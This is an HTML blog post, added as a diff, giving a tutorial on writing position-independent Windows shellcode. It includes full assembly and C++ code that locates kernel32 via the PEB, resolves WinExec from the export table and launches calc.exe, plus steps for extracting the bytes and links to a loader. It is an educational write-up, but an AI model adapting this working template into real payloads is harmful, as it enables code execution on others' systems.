@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="/imgs/avatar.png"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="> This article was first published on the [Xianzhi Community](https://xz.">
+<meta property="og:title" content="A Simple Guide to Writing Windows Shellcode">
+<meta property="og:description" content="> This article was first published on the [Xianzhi Community](https://xz.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://blog.imipy.com/post/a-simple-guide-to-writing-windows-shellcode.html">
+<meta property="og:image" content="/imgs/avatar.png">
+<title>A Simple Guide to Writing Windows Shellcode</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">A Simple Guide to Writing Windows Shellcode</h1>
+<div class="title-right">
+    <a href="https://blog.imipy.com" id="buttonHome" class="btn btn-invisible circle" title="home">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="switch theme">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><blockquote>
+<p>This article was first published on the <a href="https://xz.aliyun.com/t/10078" rel="nofollow">Xianzhi Community</a>.</p>
+</blockquote>
+<h2>What is Shellcode?</h2>
+<blockquote>
+<p>Shellcode is a specially designed, position-independent binary code that is typically used as a payload in exploits to perform specific operations, such as spawning a shell or gaining control over a system.</p>
+</blockquote>
+<p>To write position-independent code, the following points should be taken into account:</p>
+<ul>
+<li>
+<p>The string must be stored dynamically on the stack.</p>
+</li>
+<li>
+<p><strong>Function Addressing in DLLs</strong>: Due to ASLR (Address Space Layout Randomization), DLLs do not load at the same address every time. You can locate loaded modules through PEB.PEB_LDR_DATA to call their exported functions or load a new DLL.</p>
+</li>
+<li>
+<p><strong>Avoid Null Bytes</strong>: A <code class="notranslate">NULL</code> byte (<code class="notranslate">0x00</code>) is treated as a string terminator in C/C++ code. If <code class="notranslate">NULL</code> bytes appear in the shellcode, they may interfere with the functionality of the target application, and the shellcode might fail to copy correctly into memory.</p>
+<p><code class="notranslate">mov ebx, 0x00</code> you can use the following equivalent instruction to avoid null bytes: <code class="notranslate">xor ebx, ebx</code>.</p>
+</li>
+<li>
+<p>Character Restrictions: In certain scenarios, shellcode must also avoid characters like \r or \n and may even need to use alphanumeric-only characters.</p>
+</li>
+</ul>
+<h2>The Mechanism Behind DLL Loading on Windows</h2>
+<p>In Windows, applications cannot directly access system calls. Instead, they use functions from the Windows API (WinAPI), which are stored in DLLs such as <code class="notranslate">kernel32.dll</code>, <code class="notranslate">advapi32.dll</code>, <code class="notranslate">gdi32.dll</code>, etc. <code class="notranslate">ntdll.dll</code> and <code class="notranslate">kernel32.dll</code> are especially important, as every process imports them.</p>
+<p>Here is the program I wrote, called <a href="https://github.com/ac0d3r/0xpe/blob/master/shellcode/nothing_to_do.cpp">nothing_to_do</a>. I used <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/listdlls" rel="nofollow">listdlls</a> to list the imported DLLs.</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/b1cb2274-5d78-412b-a578-03fa5b80621e"><img src="https://github.com/user-attachments/assets/b1cb2274-5d78-412b-a578-03fa5b80621e" alt="image" style="max-width: 100%;"></a></p>
+<h2>DLL Addressing</h2>
+<p>The <a href="https://en.wikipedia.org/wiki/Win32_Thread_Information_Block" rel="nofollow">TEB (Thread Environment Block)</a> structure contains thread information in user mode. On 32-bit systems, we can use the <code class="notranslate">FS</code> register to find the address of the <a href="https://en.wikipedia.org/wiki/Process_Environment_Block" rel="nofollow">PEB (Process Environment Block)</a> at offset <code class="notranslate">0x30</code>.</p>
+<p><code class="notranslate">PEB.ldr</code> points to the <code class="notranslate">PEB_LDR_DATA</code> structure, which contains information about the loaded modules, including the base addresses of <code class="notranslate">kernel32</code> and <code class="notranslate">ntdll</code>.</p>
+<div class="highlight highlight-source-c++"><pre class="notranslate"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> <span class="pl-en">_PEB_LDR_DATA</span> {
+  BYTE       Reserved1[<span class="pl-c1">8</span>];
+  PVOID      Reserved2[<span class="pl-c1">3</span>];
+  LIST_ENTRY InMemoryOrderModuleList;
+} PEB_LDR_DATA, *PPEB_LDR_DATA;</pre></div>
+<p><code class="notranslate">PEB_LDR_DATA.InMemoryOrderModuleList</code> contains the head of a doubly linked list of the modules loaded in the process. Each entry in the list is a pointer to an <code class="notranslate">LDR_DATA_TABLE_ENTRY</code> structure.</p>
+<div class="highlight highlight-source-c++"><pre class="notranslate"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> <span class="pl-en">_LIST_ENTRY</span>
+{
+     PLIST_ENTRY Flink;
+     PLIST_ENTRY Blink;
+} LIST_ENTRY, *PLIST_ENTRY;</pre></div>
+<p>Information about the loaded DLL in <code class="notranslate">LDR_DATA_TABLE_ENTRY</code>:</p>
+<div class="highlight highlight-source-c++"><pre class="notranslate"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> <span class="pl-en">_LDR_DATA_TABLE_ENTRY</span> {
+    PVOID Reserved1[<span class="pl-c1">2</span>];
+    LIST_ENTRY InMemoryOrderLinks;
+    PVOID Reserved2[<span class="pl-c1">2</span>];
+    PVOID DllBase;
+    PVOID EntryPoint;
+    PVOID Reserved3;
+    UNICODE_STRING FullDllName;
+    BYTE Reserved4[<span class="pl-c1">8</span>];
+    PVOID Reserved5[<span class="pl-c1">3</span>];
+    <span class="pl-k">union</span> {
+        ULONG CheckSum;
+        PVOID Reserved6;
+    };
+    ULONG TimeDateStamp;
+} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</pre></div>
+<blockquote>
+<p><strong>Tips:</strong><br>
+In Windows versions prior to Vista, the first two DLLs in <code class="notranslate">InInitializationOrderModuleList</code> are <code class="notranslate">ntdll.dll</code> and <code class="notranslate">kernel32.dll</code>, but for Vista and later versions, the second DLL is changed to <code class="notranslate">kernelbase.dll</code>.<br>
+In <code class="notranslate">InMemoryOrderModuleLis</code>t, the first entry is <code class="notranslate">calc.exe</code> (the executable), the second is <code class="notranslate">ntdll.dll</code>, and the third is <code class="notranslate">kernel32.dll</code>. This method currently applies to all versions of Windows and is the preferred approach.</p>
+</blockquote>
+<h3>Kernel32.dll Addressing Process:</h3>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/7cf0ef92-56ac-4a54-999f-7d21d1ce4f9d"><img src="https://github.com/user-attachments/assets/7cf0ef92-56ac-4a54-999f-7d21d1ce4f9d" alt="image" style="max-width: 100%;"></a></p>
+<p>Implementing with Assembly Code:</p>
+<div class="highlight highlight-source-assembly"><pre class="notranslate"><span class="pl-k">xor</span><span class="pl-en"> </span><span class="pl-v">ecx</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-v">ecx</span>
+<span class="pl-k">mov</span><span class="pl-en"> </span><span class="pl-v">ebx</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-v">fs</span><span class="pl-en">:</span><span class="pl-s1">[</span><span class="pl-v">ecx</span><span class="pl-en"> </span><span class="pl-s1">+</span><span class="pl-en"> </span><span class="pl-c1">0x30</span><span class="pl-s1">]</span><span class="pl-c">    ; *ebx = PEB base address</span>
+<span class="pl-k">mov</span><span class="pl-en"> </span><span class="pl-v">ebx</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-s1">[</span><span class="pl-v">ebx</span><span class="pl-s1">+</span><span class="pl-c1">0x0c</span><span class="pl-s1">]</span><span class="pl-c">         ; ebx = PEB.Ldr</span>
+<span class="pl-k">mov</span><span class="pl-en"> </span><span class="pl-v">esi</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-s1">[</span><span class="pl-v">ebx</span><span class="pl-s1">+</span><span class="pl-c1">0x14</span><span class="pl-s1">]</span><span class="pl-c">         ; ebx = PEB.Ldr.InMemoryOrderModuleList</span>
+<span class="pl-k">lodsd</span><span class="pl-c">                       ; eax = Second module</span>
+<span class="pl-k">xchg</span><span class="pl-en"> </span><span class="pl-v">eax</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-v">esi</span><span class="pl-c">               ; eax = esi, esi = eax</span>
+<span class="pl-k">lodsd</span><span class="pl-c">                       ; eax = Third(kernel32)</span>
+<span class="pl-k">mov</span><span class="pl-en"> </span><span class="pl-v">ebx</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-s1">[</span><span class="pl-v">eax</span><span class="pl-en"> </span><span class="pl-s1">+</span><span class="pl-en"> </span><span class="pl-c1">0x10</span><span class="pl-s1">]</span><span class="pl-c">       ; ebx = dll Base address</span></pre></div>
+<h3>Function Addressing in Kernel32.dll Export Table</h3>
+<blockquote>
+<p>Previously, I studied PE structure-related materials <a href="https://github.com/ac0d3r/0xpe/tree/master/pe-demo">here</a>.</p>
+</blockquote>
+<p><code class="notranslate">ImageOptionalHeader32.DataDirectory[0].VirtualAddress</code> points to the Export Table RVA. The structure of the Export Table is as follows:</p>
+<div class="highlight highlight-source-c++"><pre class="notranslate"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> <span class="pl-en">_IMAGE_EXPORT_DIRECTORY</span> {
+    DWORD   Characteristics;
+    DWORD   TimeDateStamp;      <span class="pl-c"><span class="pl-c">//</span> Timestamp</span>
+    WORD    MajorVersion;
+    WORD    MinorVersion;
+    DWORD   Name;               <span class="pl-c"><span class="pl-c">//</span> Pointer to the export table's filename string</span>
+    DWORD   Base;               <span class="pl-c"><span class="pl-c">//</span> Starting ordinal of the export table</span>
+    DWORD   NumberOfFunctions;  <span class="pl-c"><span class="pl-c">//</span> Number of exported functions (more accurately, the number of elements in AddressOfFunctions, not the number of functions)</span>
+    DWORD   NumberOfNames;      <span class="pl-c"><span class="pl-c">//</span> Number of functions exported by name</span>
+    DWORD   AddressOfFunctions;     <span class="pl-c"><span class="pl-c">//</span> Exported function address table RVA: stores the addresses of all exported functions (table element width is 4, total size is NumberOfFunctions * 4)</span>
+    DWORD   AddressOfNames;         <span class="pl-c"><span class="pl-c">//</span> Exported function names table RVA: stores the addresses of function name strings (table element width is 4, total size is NumberOfNames * 4)</span>
+    DWORD   AddressOfNameOrdinals;  <span class="pl-c"><span class="pl-c">//</span> Exported function ordinal table RVA: stores the function ordinals (table element width is 2, total size is NumberOfNames * 2)</span>
+} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</pre></div>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/a0a43d0e-ab05-4793-a286-67a287e13a94"><img src="https://github.com/user-attachments/assets/a0a43d0e-ab05-4793-a286-67a287e13a94" alt="image" style="max-width: 100%;"></a></p>
+<p>Implementing with Assembly Code:</p>
+<div class="highlight highlight-source-assembly"><pre class="notranslate"><span class="pl-c">;; Find PE export table</span>
+<span class="pl-k">mov</span><span class="pl-en"> </span><span class="pl-v">edx</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-s1">[</span><span class="pl-v">ebx</span><span class="pl-en"> </span><span class="pl-s1">+</span><span class="pl-en"> </span><span class="pl-c1">0x3c</span><span class="pl-s1">]</span><span class="pl-c">   ; Find the e_lfanew offset in the DOS header</span>
+<span class="pl-k">add</span><span class="pl-en"> </span><span class="pl-v">edx</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-v">ebx</span><span class="pl-c">            ; edx =  pe header</span>
+<span class="pl-k">mov</span><span class="pl-en"> </span><span class="pl-v">edx</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-s1">[</span><span class="pl-v">edx</span><span class="pl-en"> </span><span class="pl-s1">+</span><span class="pl-en"> </span><span class="pl-c1">0x78</span><span class="pl-s1">]</span><span class="pl-c">   ; edx = offset export table</span>
+<span class="pl-k">add</span><span class="pl-en"> </span><span class="pl-v">edx</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-v">ebx</span><span class="pl-c">            ; edx = export table</span>
+<span class="pl-k">mov</span><span class="pl-en"> </span><span class="pl-v">esi</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-s1">[</span><span class="pl-v">edx</span><span class="pl-en"> </span><span class="pl-s1">+</span><span class="pl-en"> </span><span class="pl-c1">0x20</span><span class="pl-s1">]</span><span class="pl-c">   ; esi = offset names table</span>
+<span class="pl-k">add</span><span class="pl-en"> </span><span class="pl-v">esi</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-v">ebx</span><span class="pl-c">            ; esi = names table</span>
+
+<span class="pl-c">;; Find the `Winexec` Function Name</span>
+<span class="pl-k">xor</span><span class="pl-en"> </span><span class="pl-v">ecx</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-v">ecx</span>
+<span class="pl-en">Get_Function:</span>
+<span class="pl-en">    </span><span class="pl-k">inc</span><span class="pl-en"> </span><span class="pl-v">ecx</span><span class="pl-c">                         ; ecx++</span>
+<span class="pl-en">    </span><span class="pl-k">lodsd</span><span class="pl-c">                           ; eax = Next function name string RVA</span>
+<span class="pl-en">    </span><span class="pl-k">add</span><span class="pl-en"> </span><span class="pl-v">eax</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-v">ebx</span><span class="pl-c">                    ; eax = Function name string pointer</span>
+<span class="pl-en">    </span><span class="pl-k">cmp</span><span class="pl-en"> dword ptr</span><span class="pl-s1">[</span><span class="pl-v">eax</span><span class="pl-s1">],</span><span class="pl-en"> </span><span class="pl-c1">0x456E6957</span><span class="pl-c">  ; eax[0:4] == EniW</span>
+<span class="pl-en">    </span><span class="pl-k">jnz</span><span class="pl-en"> Get_Function</span>
+<span class="pl-k">dec</span><span class="pl-en"> </span><span class="pl-v">ecx</span><span class="pl-c">;</span>
+
+<span class="pl-c">;;Find the Winexec Function Pointer</span>
+<span class="pl-k">mov</span><span class="pl-en"> </span><span class="pl-v">esi</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-s1">[</span><span class="pl-v">edx</span><span class="pl-en"> </span><span class="pl-s1">+</span><span class="pl-en"> </span><span class="pl-c1">0x24</span><span class="pl-s1">]</span><span class="pl-c">     ; esi = ordianl table rva</span>
+<span class="pl-k">add</span><span class="pl-en"> </span><span class="pl-v">esi</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-v">ebx</span><span class="pl-c">              ; esi = ordianl table</span>
+<span class="pl-k">mov</span><span class="pl-en"> </span><span class="pl-v">cx</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-s1">[</span><span class="pl-v">esi</span><span class="pl-en"> </span><span class="pl-s1">+</span><span class="pl-en"> </span><span class="pl-v">ecx</span><span class="pl-en"> </span><span class="pl-s1">*</span><span class="pl-en"> </span><span class="pl-c1">2</span><span class="pl-s1">]</span><span class="pl-c">   ; ecx = func ordianl</span>
+<span class="pl-k">mov</span><span class="pl-en"> </span><span class="pl-v">esi</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-s1">[</span><span class="pl-v">edx</span><span class="pl-en"> </span><span class="pl-s1">+</span><span class="pl-en"> </span><span class="pl-c1">0x1c</span><span class="pl-s1">]</span><span class="pl-c">     ; esi = address table rva</span>
+<span class="pl-k">add</span><span class="pl-en"> </span><span class="pl-v">esi</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-v">ebx</span><span class="pl-c">              ; esi = address table</span>
+<span class="pl-k">mov</span><span class="pl-en"> </span><span class="pl-v">edx</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-s1">[</span><span class="pl-v">esi</span><span class="pl-en"> </span><span class="pl-s1">+</span><span class="pl-en"> </span><span class="pl-v">ecx</span><span class="pl-en"> </span><span class="pl-s1">*</span><span class="pl-en"> </span><span class="pl-c1">4</span><span class="pl-s1">]</span><span class="pl-c">  ; edx = func address rva</span>
+<span class="pl-k">add</span><span class="pl-en"> </span><span class="pl-v">edx</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-v">ebx</span><span class="pl-c">              ; edx = func address</span>
+
+<span class="pl-c">;; Call the Winexec Function</span>
+<span class="pl-k">xor</span><span class="pl-en"> </span><span class="pl-v">eax</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-v">eax</span>
+<span class="pl-k">push</span><span class="pl-en"> </span><span class="pl-v">edx</span>
+<span class="pl-k">push</span><span class="pl-en"> </span><span class="pl-v">eax</span><span class="pl-c">        ; 0x00</span>
+<span class="pl-k">push</span><span class="pl-en"> </span><span class="pl-c1">0x6578652e</span>
+<span class="pl-k">push</span><span class="pl-en"> </span><span class="pl-c1">0x636c6163</span>
+<span class="pl-k">push</span><span class="pl-en"> </span><span class="pl-c1">0x5c32336d</span>
+<span class="pl-k">push</span><span class="pl-en"> </span><span class="pl-c1">0x65747379</span>
+<span class="pl-k">push</span><span class="pl-en"> </span><span class="pl-c1">0x535c7377</span>
+<span class="pl-k">push</span><span class="pl-en"> </span><span class="pl-c1">0x6f646e69</span>
+<span class="pl-k">push</span><span class="pl-en"> </span><span class="pl-c1">0x575c3a43</span>
+<span class="pl-k">mov</span><span class="pl-en"> </span><span class="pl-v">esi</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-v">esp</span><span class="pl-c">    ; esi = "C:\\Windows\\System32\\calc.exe"</span>
+<span class="pl-k">push</span><span class="pl-en"> </span><span class="pl-c1">10</span><span class="pl-c">         ; window state SW_SHOWDEFAULT</span>
+<span class="pl-k">push</span><span class="pl-en"> </span><span class="pl-v">esi</span><span class="pl-c">        ; "C:\\Windows\\System32\\calc.exe"</span>
+<span class="pl-k">call</span><span class="pl-en"> </span><span class="pl-v">edx</span><span class="pl-c">        ; WinExec(esi, 10)</span></pre></div>
+<p>Final <a href="https://github.com/ac0d3r/0xpe/blob/master/shellcode/shellcode.cpp">Code</a>:</p>
+<div class="highlight highlight-source-c++"><pre class="notranslate"><span class="pl-k">int</span> <span class="pl-en">main</span>()
+{
+    __asm {
+        ; Find where kernel32.<span class="pl-smi">dll</span> is loaded into memory
+        <span class="pl-k">xor</span> ecx, ecx
+        mov ebx, fs:[ecx + <span class="pl-c1">0x30</span>]    ; *ebx = PEB base address
+        mov ebx, [ebx+<span class="pl-c1">0x0c</span>]         ; ebx = PEB.<span class="pl-smi">Ldr</span>
+        mov esi, [ebx+<span class="pl-c1">0x14</span>]         ; ebx = PEB.<span class="pl-smi">Ldr</span>.<span class="pl-smi">InMemoryOrderModuleList</span>
+        lodsd                       ; eax = Second <span class="pl-k">module</span>
+        xchg eax, esi               ; eax = esi, esi = eax
+        lodsd                       ; eax = <span class="pl-c1">Third</span>(kernel32)
+        mov ebx, [eax + <span class="pl-c1">0x10</span>]       ; ebx = dll Base address
+
+        ;; Find PE <span class="pl-k">export</span> table
+        mov edx, [ebx + <span class="pl-c1">0x3c</span>]   ; Find the e_lfanew offset in the DOS header
+        add edx, ebx            ; edx =  pe header
+        mov edx, [edx + <span class="pl-c1">0x78</span>]   ; edx = offset <span class="pl-k">export</span> table
+        add edx, ebx            ; edx = <span class="pl-k">export</span> table
+        mov esi, [edx + <span class="pl-c1">0x20</span>]   ; esi = offset names table
+        add esi, ebx            ; esi = names table
+
+        ;; Find the `Winexec` Function Name
+        <span class="pl-k">xor</span> ecx, ecx
+        Get_Function:
+            inc ecx                         ; ecx++
+            lodsd                           ; eax = Next function name string RVA
+            add eax, ebx                    ; eax = Function name string pointer
+            cmp dword ptr[eax], <span class="pl-c1">0x456E6957</span>  ; eax[<span class="pl-c1">0</span>:<span class="pl-c1">4</span>] == EniW
+            jnz Get_Function
+        dec ecx;
+
+        ;;Find the Winexec Function Pointer
+        mov esi, [edx + <span class="pl-c1">0x24</span>]     ; esi = ordianl table rva
+        add esi, ebx              ; esi = ordianl table
+        mov cx, [esi + ecx * <span class="pl-c1">2</span>]   ; ecx = func ordianl
+        mov esi, [edx + <span class="pl-c1">0x1c</span>]     ; esi = address table rva
+        add esi, ebx              ; esi = address table
+        mov edx, [esi + ecx * <span class="pl-c1">4</span>]  ; edx = func address rva
+        add edx, ebx              ; edx = func address
+
+        ;; Call the Winexec Function
+        <span class="pl-k">xor</span> eax, eax
+        push edx
+        push eax        ; <span class="pl-c1">0x00</span>
+        push <span class="pl-c1">0x6578652e</span>
+        push <span class="pl-c1">0x636c6163</span>
+        push <span class="pl-c1">0x5c32336d</span>
+        push <span class="pl-c1">0x65747379</span>
+        push <span class="pl-c1">0x535c7377</span>
+        push <span class="pl-c1">0x6f646e69</span>
+        push <span class="pl-c1">0x575c3a43</span>
+        mov esi, esp    ; esi = <span class="pl-s"><span class="pl-pds">"</span>C:<span class="pl-cce">\\</span>Windows<span class="pl-cce">\\</span>System32<span class="pl-cce">\\</span>calc.exe<span class="pl-pds">"</span></span>
+        push <span class="pl-c1">10</span>         ; window state SW_SHOWDEFAULT
+        push esi        ; <span class="pl-s"><span class="pl-pds">"</span>C:<span class="pl-cce">\\</span>Windows<span class="pl-cce">\\</span>System32<span class="pl-cce">\\</span>calc.exe<span class="pl-pds">"</span></span>
+        call edx        ; <span class="pl-c1">WinExec</span>(esi, <span class="pl-c1">10</span>)
+
+        ; exit
+        add esp, <span class="pl-c1">0x1c</span>
+        pop eax
+        pop edx
+    }
+    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
+}</pre></div>
+<p>It was compiled using <code class="notranslate">Visual Studio</code>, resulting in a very large size. By rewriting it in <code class="notranslate">MASM</code>, I was able to produce a much smaller file: <a href="https://github.com/ac0d3r/0xpe/blob/master/shellcode/shellcode.asm">shellcode.asm</a>.</p>
+<h2>Extract Shellcode</h2>
+<p>Compile MASM:</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">F:<span class="pl-cce">\\</span><span class="pl-k">&gt;</span> ml -c -coff .<span class="pl-cce">\\</span>shellcode.asm
+F:<span class="pl-cce">\\</span><span class="pl-k">&gt;</span> link -subsystem:windows .<span class="pl-cce">\\</span>shellcode.obj</pre></div>
+<p>There are two methods to extract shellcode:</p>
+<ol>
+<li>Use dumpbin.exe: <code class="notranslate">$ dumpbin.exe /ALL .\\shellcode.obj</code><br>
+<a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/8aac56ce-7a6e-45df-a7f4-d7caeae00af4"><img src="https://github.com/user-attachments/assets/8aac56ce-7a6e-45df-a7f4-d7caeae00af4" alt="image" style="max-width: 100%;"></a></li>
+<li>Extract the PE .text section Data: starting from PointerToRawData, and retrieve data of size VirtualSize:<br>
+<a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/a423e706-9afa-4435-86a3-c3aaff668234"><img src="https://github.com/user-attachments/assets/a423e706-9afa-4435-86a3-c3aaff668234" alt="image" style="max-width: 100%;"></a></li>
+</ol>
+<h2>Shellcode Loader</h2>
+<p>Write a loader in Golang, code: <a href="https://github.com/ac0d3r/0xpe/blob/master/shellcode/loader.go">loader.go</a>. Compile using the <a href="https://github.com/ac0d3r/0xpe/blob/master/shellcode/Makefile">Makefile</a>, and the run it:</p>
+<p>You did it 🎉<br>
+<a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/17ce5763-8850-409e-a4a5-20ef1986139d"><img src="https://github.com/user-attachments/assets/17ce5763-8850-409e-a4a5-20ef1986139d" alt="" style="max-width: 100%;"></a></p>
+<h2>Reference</h2>
+<ul>
+<li><a href="https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html" rel="nofollow">https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html</a></li>
+<li><a href="https://securitycafe.ro/2015/10/30/introduction-to-windows-shellcode-development-part1/" rel="nofollow">https://securitycafe.ro/2015/10/30/introduction-to-windows-shellcode-development-part1/</a></li>
+<li><a href="https://securitycafe.ro/2015/12/14/introduction-to-windows-shellcode-development-part-2/" rel="nofollow">https://securitycafe.ro/2015/12/14/introduction-to-windows-shellcode-development-part-2/</a></li>
+<li><a href="https://securitycafe.ro/2016/02/15/introduction-to-windows-shellcode-development-part-3/" rel="nofollow">https://securitycafe.ro/2016/02/15/introduction-to-windows-shellcode-development-part-3/</a></li>
+</ul>
+</div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">comments</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://blog.imipy.com">zznQ</a></div>
+<div id="footer2">
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if("01/05/2018"!=""){
+    var startSite=new Date("01/05/2018");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="run "+diffDay+" days"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 